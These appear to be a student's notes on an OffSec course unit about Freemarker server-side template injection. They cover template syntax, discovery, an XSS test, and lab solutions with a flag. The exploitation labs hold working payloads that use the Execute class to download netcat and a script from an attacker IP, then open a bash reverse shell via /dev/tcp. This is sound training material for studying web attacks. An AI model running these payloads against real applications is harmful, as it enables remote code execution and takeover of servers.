This Learning Unit covers the following Learning Objectives:

1. Understand the basic syntax of Freemarker
2. Understand how to discover a Freemarker template in a black box scenario
3. Understand how to reach RCE with a Freemarker Template

-------------
#### 11.3.1. Freemarker - Discovery

WhileÂ _Apache Freemarker_[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-exploitation-31043#fn-local_id_180-1)Â is a general purpose templating engine, it is commonly paired with Java applications. Similarly to what Twig did for inline PHP, Freemarker did forÂ _Jakarta Server Pages_[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-exploitation-31043#fn-local_id_180-2)Â (previously known asÂ _Java Server Pages_, or JSP). Freemarker provides a better option for developers to separate the manipulation of data from its display.

Let's review an example Freemarker template. This template can also be found on the sandbox atÂ `/freemarker`.

```java
01  <h1>Hello ${name}!</h1>
02  <#if name == "hacker">
03  The top reasons you're great:
04    <#list reasons as reason>
05     ${reason?index + 1}: ${reason}
06    </#list>
07  </#if>
```
This template includes aÂ _name_Â variable and aÂ _reasons_Â array.
![[Pasted image 20241022163241.png]]
Let's break down this template to review its various components, starting with the first line.
```js
01  <h1>Hello ${name}!</h1>
```
This line begins with a greeting that demonstrates a Freemarker expression, which Freemarker calls an interpolation. The starting delimiter is a dollar sign and open curly bracket `(${)`. The ending delimiter is a closed curly bracket. In between, we'll find the variable to be displayed, in this case "Hello Ofira!".

Next, let's review theÂ _if_Â statement.

```js
02  <#if name == "hacker">
...
07  </#if>
```
TheÂ _if_Â statement starts with what Freemarker refers to as anÂ _FTL tag_.[3](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/apache-freemarker-discovery-and-exploitation-31302/freemarker-discovery-31036#fn-local_id_180-3)Â These are very similar to statements in other templating languages. The top tag indicates the start of theÂ _if_Â statement, and the bottom tag indicates the end of the statement. The top tag contains the syntax to check if theÂ _name_Â variable is set to "hacker". This means that the content in this section will only be displayed if the name is "hacker". We can change theÂ _name_Â to "hacker" and find the additional content is rendered.
![[Pasted image 20241022172540.png]]
The content in between theÂ _if_Â statement is generated using a loop.

```js
04    <#list reasons as reason>
05     ${reason?index + 1}: ${reason}
06    </#list>
```

A loop also begins with an FTL tag or statement. The code loops through the contents of theÂ _reasons_Â list, extracting each value into theÂ _reason_Â variable. The reason is displayed with theÂ _${reason}_Â expression. Before the reason is displayed, the index is extracted and 1 is added to the variable so that the list can start with 1 instead of 0.

Before 2016, Freemarker required developers to specify if a variable needs to be HTML escaped. It's easy to overlook this setting when displaying variables. After 2016, Freemarker implemented a system that would auto-escape variables if the content type was an HTML document. However, most other templating engines will always escape HTML content unless specified not to. This means that applications that use Freemarker templates are much more susceptible to XSS than other templating engines. We can observe this by wrapping the name with an HTML tag. We'll set the name to be "<i>Ofira</i>".

![[Pasted image 20241022173053.png]]

This results in the name being italicized, confirming that the HTML was rendered. We can leverage this tactic to execute XSS against the target.

Since Java uses strict variable types, we can typically discover if a target is rendering Freemarker templates by attempting to cause an error by mixing variable types. For example, if we were to try to multiply two numbers, we'd expect everything to work.

```js
${7*7}
```
![[Pasted image 20241022173102.png]]
However, if we change one number to a string, we should expect a syntax error.

![[Pasted image 20241022173113.png]]
While this isn't the strongest indicator, if there is reason to believe that we are dealing with a Java app, we notice "${" is used as a delimiter, and the application crashes when multiplying a string, we can guess that the target is running Freemarker.

Go toÂ `http://template-sandbox/freemarker`Â for the following exercises.


##### Labs
1.
![[Pasted image 20241024083556.png]]
- This script was given by default, 
```js
<h1>Hello ${SECRET_STRING}!</h1>
<#if name == "hacker">
The top reasons you're great:
  <#list reasons as reason>
   ${reason?index + 1}: ${reason}
  </#list>
</#if>
```
![[Pasted image 20241022173213.png]]

2.
![[Pasted image 20241024085402.png]]
- Listing  `SECRET_ARRAY` as `item` - item can be anything.
```js
<#-- Iterate over SECRET_ARRAY and display each item -->
<#list SECRET_ARRAY as item>
    ${item}
</#list>
```
![[Pasted image 20241022173359.png]]

3.
![[Pasted image 20241024085442.png]]
- used in the variables field to give flag
```js
${"<script>alert('XSS');</script>"}
```
![[Pasted image 20241022173600.png]]

------------

#### 11.3.2 Freemarker - Exploitation
Let's start once again by reviewing the documentation for a hint that might lead to file execution. A good place to start is the FAQs.[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/apache-freemarker-discovery-and-exploitation-31302/freemarker-discovery-31036#fn-local_id_72-1)Â One of the questions asks: "Can I allow users to upload templates and what are the security implications?" What better teachers to show us how we might exploit a library than the developers themselves?

The bullet point towards the bottom gives us a great clue:
-----------------------------------------------------------------------------
The new built-in (Configuration.setNewBuiltinClassResolver, Environment.setNewBuiltinClassResolver): is used in templates like "com.example.SomeClass"?new(), and is important for FTL libraries that are partially implemented in Java, but shouldn't be needed in normal templates. While new will not instantiate classes that are not TemplateModel-s, FreeMarker contains a TemplateModel class that can be used to create arbitrary Java objects.

It seems that Freemarker supports the ability to initiate new classes. However, as the documentation states, the class has to implement theÂ _TemplateModel_Â class. We know that the application has Freemarker installed, so let's use the Java API documentation to review which classes we have access to.[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/apache-freemarker-discovery-and-exploitation-31302/freemarker-exploitation-31044#fn-local_id_72-2)

Reviewing the list of all classes, we find one calledÂ _execute_.[3](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/apache-freemarker-discovery-and-exploitation-31302/freemarker-exploitation-31044#fn-local_id_72-3)

![[Pasted image 20241024092133.png]]

Not only does this page show a warning that it will allow a user to execute arbitrary code, it also shows us that it implements theÂ _TemplateModel_Â class. We now know how to instantiate a new class and which class to use. Let's put it together and build the payload.

```js
${"freemarker.template.utility.Execute"?new()("whoami")}
```

Wonderful! We can now execute system-level commands in Freemarker.

Go toÂ `http://template-sandbox/freemarker`Â for the following exercise.


##### Labs
1. `OS{RibljaCorba}`
![[Pasted image 20241024112028.png]]
curling over netcat and outputting to /tmp
```bash
${"freemarker.template.utility.Execute"?new()("curl http://192.168.45.222:80/nc")}
${"freemarker.template.utility.Execute"?new()("curl -o /tmp/nc http://192.168.45.222/nc")}

```
![[Pasted image 20241024095808.png]]
Checking permissions of the `/tmp/nc`
```js
${"freemarker.template.utility.Execute"?new()("ls -la /tmp/")}
```
![[Pasted image 20241024100936.png]]
Adding execution privileges to `/tmp/nc`
```bash
${"freemarker.template.utility.Execute"?new()("chmod +x /tmp/nc")}
```
Checking to make sure that permissions were changed
![[Pasted image 20241024101305.png]]
```js
${"freemarker.template.utility.Execute"?new()("/tmp/nc 192.168.45.222 4444 -e /bin/bash")}
```
***This didnt work, was unable to get necat to properly execute a reverse shell***

##### WORKING
revshell
```js
â”Œâ”€â”€(rootðŸ’€gobots)-[24Oct2024 15:18:07]-[/tmp]
â””â”€# cat revshell 
bash -i >& /dev/tcp/192.168.45.222/4444 0>&1
```
- found this in discord, curls over a `revshell` outputs to `/tmp/`, gives `execution` permissions, and executes the payload
- this didnt work in one command for me
```js
1. ${"freemarker.template.utility.Execute"?new()("curl [http://192.168.45.160:1337/revshell](http://192.168.45.160:1337/revshell "http://192.168.45.160:1337/revshell") -o /tmp/revshell && chmod 777 /tmp/revshell && /tmp/revshell")}
```
outputting the flag to `/tmp/revshell`
```js
${"freemarker.template.utility.Execute"?new()("curl -o /tmp/revshell http://192.168.45.222:80/revshell")}
```
changing permissions to `+x /tmp/revshell`
```js
${"freemarker.template.utility.Execute"?new()("chmod +x /tmp/revshell")}
```
executing the shell
```js
${"freemarker.template.utility.Execute"?new()("/tmp/revshell")}
```
![[Pasted image 20241024111751.png]]
flag: `OS{RibljaCorba}`
![[Pasted image 20241024111922.png]]